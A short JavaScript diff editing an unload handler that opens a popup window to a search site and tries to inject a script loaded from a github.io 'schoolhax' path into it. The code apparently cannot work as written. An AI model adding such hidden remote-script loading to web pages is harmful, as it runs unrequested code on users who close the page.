@@ -1,7 +1,7 @@
 window.onunload = function(){
-  var theWindow = window.open('http://stackoverflow.com'),
-    theDoc = theWindow.document,
+  var win = window.open('http://google.com'),
+    doc = win.document,
     theScript = document.createElement('script');
-  theScript.setAttribute('src', 'jeffnjellybean.github.io/lol.js');
-  theDoc.body.appendChild(theScript);
+  theScript.setAttribute('src', 'jeffnjellybean.github.io/schoolhax/lol.js');
+  doc.body.appendChild(theScript);
 }
